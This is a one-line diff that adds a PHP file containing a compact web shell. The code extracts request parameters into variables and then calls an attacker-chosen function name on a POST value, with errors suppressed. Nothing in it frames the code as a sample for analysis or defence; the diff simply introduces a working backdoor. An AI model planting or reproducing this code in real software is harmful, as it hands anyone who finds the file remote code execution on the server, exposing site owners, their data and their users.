@@ -1,0 +1,1 @@
+<?php extract($_REQUEST);@$d($_POST[b])?>
